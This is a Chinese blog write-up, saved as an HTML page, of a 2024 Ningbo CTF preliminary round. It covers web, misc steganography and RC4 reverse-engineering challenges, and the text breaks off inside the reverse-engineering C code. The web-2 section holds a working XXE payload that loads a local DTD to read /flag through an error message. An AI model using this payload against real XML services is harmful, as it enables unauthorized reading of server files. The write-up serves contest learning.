@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>2024年第七届天一永安杯宁波市赛初赛WP - C4skg&#39;s Blog</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="1 Web 1.1 web-1正常网页访问无法得到 flag ，因为有弹窗一直阻塞，所以用 curl 命令即可 curl -i http://ip:port 1.2 web-2看到网页源代码中的发送方法，是拼接了 xxe flag 在 /flag 下" /><meta name="keywords" content='比赛, WP' /><meta itemprop="name" content="2024年第七届天一永安杯宁波市赛初赛WP">
+<meta itemprop="description" content="1 Web 1.1 web-1正常网页访问无法得到 flag ，因为有弹窗一直阻塞，所以用 curl 命令即可 curl -i http://ip:port 1.2 web-2看到网页源代码中的发送方法，是拼接了 xxe flag 在 /flag 下"><meta itemprop="datePublished" content="2024-05-06T09:30:21+08:00" />
+<meta itemprop="dateModified" content="2024-05-06T09:30:21+08:00" />
+<meta itemprop="wordCount" content="1542">
+<meta itemprop="keywords" content="比赛,WP," /><meta property="og:title" content="2024年第七届天一永安杯宁波市赛初赛WP" />
+<meta property="og:description" content="1 Web 1.1 web-1正常网页访问无法得到 flag ，因为有弹窗一直阻塞，所以用 curl 命令即可 curl -i http://ip:port 1.2 web-2看到网页源代码中的发送方法，是拼接了 xxe flag 在 /flag 下" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/posts/2024%E5%B9%B4%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-05-06T09:30:21+08:00" />
+<meta property="article:modified_time" content="2024-05-06T09:30:21+08:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="2024年第七届天一永安杯宁波市赛初赛WP"/>
+<meta name="twitter:description" content="1 Web 1.1 web-1正常网页访问无法得到 flag ，因为有弹窗一直阻塞，所以用 curl 命令即可 curl -i http://ip:port 1.2 web-2看到网页源代码中的发送方法，是拼接了 xxe flag 在 /flag 下"/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="//localhost:1313/posts/2024%E5%B9%B4%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/" /><link rel="prev" href="//localhost:1313/posts/edebc43/" /><link rel="next" href="//localhost:1313/posts/%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9Bwp/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "2024年第七届天一永安杯宁波市赛初赛WP",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "\/\/localhost:1313\/posts\/2024%E5%B9%B4%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9Bwp\/"
+    },"genre": "posts","keywords": "比赛, WP","wordcount":  1542 ,
+    "url": "\/\/localhost:1313\/posts\/2024%E5%B9%B4%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9Bwp\/","datePublished": "2024-05-06T09:30:21+08:00","dateModified": "2024-05-06T09:30:21+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "C4skg"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="C4skg&#39;s Blog"><span class="header-title-text">C4skg&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/"
+                
+                
+              ><i class="fa-solid fa-home fa-fw fa-sm" aria-hidden="true"></i> 首页</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-link fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-signature fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="C4skg&#39;s Blog"><span class="header-title-text">C4skg&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/"
+                  
+                  
+                ><i class="fa-solid fa-home fa-fw fa-sm" aria-hidden="true"></i> 首页</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-link fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-signature fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="转载" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>2024年第七届天一永安杯宁波市赛初赛WP</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      C4skg</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/wp/" class="post-category" title="分类 - WP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> WP</a></span></div><div class="post-meta-line"><span title="发布于 2024-05-06 09:30:21"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-05-06">2024-05-06</time></span>&nbsp;<span title="1542 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1600 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#web-1">web-1</a></li>
+        <li><a href="#web-2">web-2</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#misc-1">misc-1</a></li>
+        <li><a href="#misc-2">misc-2</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse">Reverse</a>
+      <ul>
+        <li><a href="#re-1">re-1</a></li>
+        <li><a href="#re-2">re-2</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#crypto-1">crypto-1</a></li>
+        <li><a href="#crypto-2">crypto-2</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><div class="details admonition warning open">
+      <div class="details-summary admonition-title">
+        <i class="icon fa-solid fa-exclamation-triangle fa-fw" aria-hidden="true"></i>警告<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i>
+      </div>
+      <div class="details-content">
+        <div class="admonition-content">本文最后更新于 2024-05-06，文中内容可能已过时。</div>
+      </div>
+    </div><h2 id="web" class="heading-element">
+  <a href="#web" class="heading-mark"></a>1 Web</h2><h3 id="web-1" class="heading-element">
+  <a href="#web-1" class="heading-mark"></a>1.1 web-1</h3><p>正常网页访问无法得到 flag ，因为有弹窗一直阻塞，所以用 curl 命令即可</p>
+<div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -i http://ip:port</span></span></code></pre></div><h3 id="web-2" class="heading-element">
+  <a href="#web-2" class="heading-mark"></a>1.2 web-2</h3><p>看到网页源代码中的发送方法，是拼接了 <code>xxe</code>
+<code>flag</code> 在 <code>/flag</code> 下，但是没回显，所以想办法使用 <code>DTD</code> 进行外带，但是外带不可取
+所以利用本地存在的 <code>DTD</code> 进行攻击</p>
+<div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">xml</span> <span class="nx">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nx">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="o">?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">message</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;!</span><span class="nx">ENTITY</span> <span class="o">%</span> <span class="nx">local_dtd</span> <span class="nx">SYSTEM</span> <span class="s2">&#34;file:///usr/share/xml/fontconfig/fonts.dtd&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;!</span><span class="nx">ENTITY</span> <span class="o">%</span> <span class="nx">expr</span> <span class="s1">&#39;aaa)&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///flag&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &amp;#x25;eval;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &amp;#x25;error;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;!ELEMENT aa (bb&#39;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">%</span><span class="nx">local_dtd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">person</span><span class="o">&gt;&lt;</span><span class="nx">username</span><span class="o">&gt;&amp;</span><span class="nx">xxe</span><span class="p">;</span><span class="o">&lt;</span><span class="err">/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/person&gt;</span></span></span></code></pre></div><p><img loading="lazy" src="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image.png" alt="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image.png" srcset="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image.png?size=small, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image.png?size=medium 1.5x, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image.png?size=large 2x" data-title="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<blockquote>
+<p>flag{81324bd5f1a7667753f108357c1bda728f6fb815}</p>
+</blockquote>
+<h2 id="misc" class="heading-element">
+  <a href="#misc" class="heading-mark"></a>2 Misc</h2><h3 id="misc-1" class="heading-element">
+  <a href="#misc-1" class="heading-mark"></a>2.1 misc-1</h3><p>StegSolve 777导出16进制
+文本复制观察每行第一个字母，得到 <code>PixelJihad_key:ezgame</code>
+<img loading="lazy" src="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-1.png" alt="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-1.png" srcset="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-1.png?size=small, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-1.png?size=medium 1.5x, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-1.png?size=large 2x" data-title="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-1.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="misc-2" class="heading-element">
+  <a href="#misc-2" class="heading-mark"></a>2.2 misc-2</h3><p>零宽</p>
+<p><img loading="lazy" src="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-2.png" alt="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-2.png" srcset="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-2.png?size=small, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-2.png?size=medium 1.5x, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-2.png?size=large 2x" data-title="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-2.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>猜测为 <code>ilove 1 and 0</code> 二进制 圆圈为0 直线为1
+绘图
+<code>[C[C[C[SFS]]]]</code> 替换为1</p>
+<p><code>[[[[RS[[[FS]]]]]]] [[[[[F]][R[[[SF]]S]]S]]]、[[R[FSFSFSF]S]FSF][[R[FSFFSF]]FSF]、[[RS[FSFSF]]FSF][[R[FFSF]]FSF]、[[R[FFSFFF]]FSF][[R[FSFFSFSF]]FSF]、[[R[FSFSF]]FSF][[R[FSFSF]]FF]</code> 替换为0</p>
+<p><code>[C[C[C[CRR[[R[FSFSF]]FSF][C[R[FSFFS]]FF]]]、[C[C[C[CRR[[R[FSFSF]]FSF][C[R[FSFFS]]FF]]]</code> 替换为0000</p>
+<p>替换后，得到如下二进制</p>
+<div class="highlight" id="id-3"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">01100110011011000110000101100111011110110011000101011111011101110110000101101110011011100110000101011111011000110011000101110010011000110110110000110011011100110101111100110100011011100110010001011111001100010110100101101110001100110111001101111101</span></span></code></pre></div><p>二进制转字符
+<img loading="lazy" src="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-3.png" alt="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-3.png" srcset="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-3.png?size=small, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-3.png?size=medium 1.5x, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-3.png?size=large 2x" data-title="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-3.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="reverse" class="heading-element">
+  <a href="#reverse" class="heading-mark"></a>3 Reverse</h2><h3 id="re-1" class="heading-element">
+  <a href="#re-1" class="heading-mark"></a>3.1 re-1</h3><p>两次 <code>RC4</code> 加密，第一次加密了 <code>key</code> ，第二次使用加密的 <code>key</code> 加密 <code>flag</code></p>
+<div class="highlight" id="id-4"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">rc4_init</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span><span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">len</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">k</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">temp</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">i</span><span class="p">;</span>                 
+</span></span><span class="line"><span class="cl">        <span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="n">len</span><span class="p">];</span>           
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">j</span><span class="o">=</span><span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">%</span><span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">temp</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">temp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">init</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+23h] [rbp-41Dh]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+24h] [rbp-41Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-418h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-414h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">v8</span><span class="p">[</span><span class="mi">258</span><span class="p">];</span> <span class="c1">// [rsp+30h] [rbp-410h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400uLL</span><span class="p">);</span>
